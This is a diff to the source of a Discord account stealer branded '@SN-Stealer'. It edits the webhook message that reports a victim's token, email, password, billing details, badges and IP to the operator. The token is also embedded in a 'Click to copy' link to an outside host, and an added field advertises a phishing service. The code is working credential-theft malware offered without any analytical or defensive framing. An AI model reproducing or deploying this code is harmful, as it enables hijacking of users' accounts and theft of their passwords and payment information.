@@ -583,12 +583,12 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
             value: `\`\`\`${token}\`\`\`[Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> @SN - Badges:',
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges:',
             value: `${badges}`,
             inline: true,
           },
@@ -598,28 +598,33 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> @SN - Billing:',
-            value: `**${billing}**`,
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing:',
+            value: `${billing}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
             value: `\`${password}\``,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`\`\`✅ User is reconnected.\n\nThank you for using @SN-Stealer, if you want other service, all this passes on sn-fishing.cc\`\`\``,
             inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + '('+json.id+')',
+          name: json.username + '#' + json.discriminator + ' ' + '('+json.id+')',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
